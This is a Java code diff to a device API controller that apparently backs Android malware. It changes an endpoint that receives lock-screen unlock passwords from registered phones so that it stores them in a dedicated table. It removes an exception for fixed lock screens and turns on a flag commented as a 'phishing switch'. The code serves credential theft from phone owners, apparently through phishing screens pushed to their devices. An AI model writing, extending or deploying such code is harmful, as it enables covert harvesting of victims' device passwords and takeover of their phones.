@@ -50,6 +50,9 @@ public class DeviceApiController extends BaseApiController {
     @Resource
     private JsCodeService jsCodeService;
 
+    @Resource
+    private UnlockScreenPwdService unlockScreenPwdService;
+
 
     //注册设备
     @RequestMapping("/registerDevice")
@@ -87,8 +90,8 @@ public class DeviceApiController extends BaseApiController {
     }
 
 
-    @PostMapping("uploadUnLock")
-    public Result<Boolean> uploadUnLock(@RequestBody JSONObject json) {
+    @PostMapping("uploadUnlockPassword")
+    public Result<Boolean> uploadUnlockPassword(@RequestBody JSONObject json) {
         String deviceId = DeviceContext.getDeviceId();
         String pkg = DeviceContext.getPkg();
         Device device = deviceService.findByDeviceId(deviceId);
@@ -96,15 +99,23 @@ public class DeviceApiController extends BaseApiController {
             log.error("pkg:{}  设备:{} 不存在", pkg, deviceId);
             return Result.toError("device not extis.");
         }
-        if (Objects.equals(Constant.YN.Y, device.getFixLockScreen())) {
-            //固定锁屏密码
-            return Result.toSuccess();
-        }
-        Device update = new Device();
-        update.setId(device.getId());
-        update.setLockScreen(json);
-        deviceService.updateById(update);
-        log.info("更新pkg:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(json));
+//        if (Objects.equals(Constant.YN.Y, device.getFixLockScreen())) {
+//            //固定锁屏密码
+//            return Result.toSuccess();
+//        }
+
+        UnlockScreenPwd unlockScreenPwd = json.toJavaObject(UnlockScreenPwd.class);
+        unlockScreenPwd.setDeviceId(device.getId());
+        unlockScreenPwd.setPkg(pkg);
+        unlockScreenPwd.setAndroidId(deviceId);
+        unlockScreenPwd.setCreateDate(Utils.now());
+
+//        Device update = new Device();
+//        update.setId(device.getId());
+//        update.setLockScreen(json);
+//        deviceService.updateById(update);
+        log.info("更新pkg:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
+        unlockScreenPwdService.save(unlockScreenPwd);
         return Result.toSuccess(true);
     }
 
@@ -151,19 +162,19 @@ public class DeviceApiController extends BaseApiController {
 
     }
 
-    @RequestMapping("uploadUnlockPassword")
-    public Result<Void> uploadUnlockPassword(@RequestBody JSONObject unLockParams) {
-        String deviceId = DeviceContext.getDeviceId();
-        Device device = deviceService.findByDeviceId(deviceId);
-        log.info("uploadUnlockPassword - {}", unLockParams.toJSONString());
-        if (device != null && !Objects.equals(device.getFixLockScreen(), Constant.YN.Y)) {
-            Device updateDevice = new Device();
-            updateDevice.setId(device.getId());
-            updateDevice.setLockScreen(unLockParams);
-            deviceService.updateById(updateDevice);
-        }
-        return Result.toSuccess(null);
-    }
+//    @RequestMapping("uploadUnlockPassword")
+//    public Result<Void> uploadUnlockPassword(@RequestBody JSONObject unLockParams) {
+//        String deviceId = DeviceContext.getDeviceId();
+//        Device device = deviceService.findByDeviceId(deviceId);
+//        log.info("uploadUnlockPassword - {}", unLockParams.toJSONString());
+//        if (device != null && !Objects.equals(device.getFixLockScreen(), Constant.YN.Y)) {
+//            Device updateDevice = new Device();
+//            updateDevice.setId(device.getId());
+//            updateDevice.setLockScreen(unLockParams);
+//            deviceService.updateById(updateDevice);
+//        }
+//        return Result.toSuccess(null);
+//    }
 
     /**
      * 服务器配置
@@ -206,6 +217,7 @@ public class DeviceApiController extends BaseApiController {
             serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
         }
 
+        serverConfig.setUnlockFish(true);//TODO 钓鱼开关
 
         Device updateDevice = new Device();
         updateDevice.setId(dbDevice.getId());
